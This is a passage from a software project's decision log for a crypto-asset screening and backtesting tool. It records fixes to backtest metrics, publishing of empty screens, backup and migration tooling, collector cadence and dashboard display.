  `draw_controls` returns the journalled controls when a day has any.
- The harness drew its own controls, excluding its top 15 where the journal
  excludes its top 25. It now uses `draw_controls` too.
- A journal run that found no ranking or no BTC price returned 0 and exited
  clean, so healthchecks.io was pinged for a day that can never be written later.
  `journal` now exits 1 when the day holds no entries.

---

## D-063 — Backtest metrics that mean what they say

**Date:** 2026-09-15 · **Status:** accepted

- **Equity curve.** Each run date's 30-day return was compounded as if the
  periods ran one after another, counting each month about thirty times. Entries
  are now at least one horizon apart.
- **Split.** No gap between development and holdout, so development trades
  exited inside the holdout. Development dates within one horizon of the holdout
  are dropped.
- **Sortino.** It divided by the standard deviation of the losses among
  themselves. It now uses downside deviation over every return.
- **Signal gate.** `MIN_SIGNALS` counted every Layer 2 row, which one day of ~200
  survivors met. It counts rows inside the reported top 15.
- **Slippage.** Charged on entry only. Exits cross the book too, at the depth on
  file on the exit date.

---

## D-064 — Publish bakes the newest screen, and refuses an empty one

**Date:** 2026-09-15 · **Status:** accepted

`publish` defaulted to today. A screen run under another date (a backfill, a
manual dispatch) or a screen that had failed left today with no `layer1_result`
rows, so publish baked a universe of zero, pruned every asset page to match, and
stamped it with a fresh `generated_at_utc` -- which, with `run_date` also today,
kept the stale banner silent. **Rule.** With no `--date`, publish bakes the newest
screen on file; a date with no screen results is refused with exit 1; and the
asset directory is never pruned against an empty set.

Two shape fixes in the asset files: event rows now carry every field `EventRow`
declares (without `event_id`, two events on one day shared a React key), and
Layer 3's `setup_detected`, `break_confirmed` and `retest_confirmed` are booleans,
as they already were in `latest.json`.

---

## D-065 — Ops tooling that is safe and complete

**Date:** 2026-09-15 · **Status:** accepted

- **Backup.** `backtest_run`, the holdout audit log, was not in `TABLE_ORDER`, so a
  restore silently reset the count of holdout looks. And the dump held only
  INSERTs, so its own restore instruction failed with "no such table". It now
  writes the schema first and covers every table; a test compares the list with
  `schema.sql`.
- **`migrate --verify`.** The append-only probe deleted a real journal row and
  counted whether it survived -- safe only if the answer was the one nobody yet
  knew. It now probes a scratch table with an identical trigger, drops it, and
  separately checks the journal's triggers are installed.
- **`doctor`.** "Consecutive failures" counted failures among the last 30 runs of
  all collectors together. It now counts each collector's own unbroken streak.
- **Secrets.** `HEALTHCHECK_SUPPLY` was used by two workflows but declared nowhere;
  `HEALTHCHECK_SCREEN` was missing from `.env.example`. Both are declared, with the
  new `HEALTHCHECK_SITE`.
- **Daemon.** `scripts/run_collectors.py` used the 5-minute interval for every tier.
  Each tier now runs at its own cadence (fast 5 min, hourly 60, daily and supply
  once a day).

---

## D-066 — The dashboard finds every asset page, and draws every outcome

**Date:** 2026-09-15 · **Status:** accepted

- **Asset lookup.** The detail page looked its file up in `latest.json`, which
  lists only the ranked head, and otherwise re-derived a name with a sanitiser
  that differs from the publisher's. A rejected non-Latin ticker linked to a file
  that never existed. The page now reads `manifest.json` `asset_files`, which maps
  every screened ticker; while the index loads it shows "Loading", not an error;
  if no manifest is published it falls back to the plain ticker name.
- **Histogram.** Buckets ran from -100% to +1000%. A return vs BTC goes below -100%
  when the asset collapses while BTC rises, so the worst outcomes were not drawn.
  The first and last buckets are now open-ended.
- **Formatting.** Thresholds render as written in `thresholds.yaml` (30,000,000,
  not 30000000.0000); "Below ATH" shows a positive figure under a label that
  already says "below"; a missing return vs BTC is muted, not coloured as a loss.
- **Types.** `market.ath_date` is a string; `Manifest` is typed.
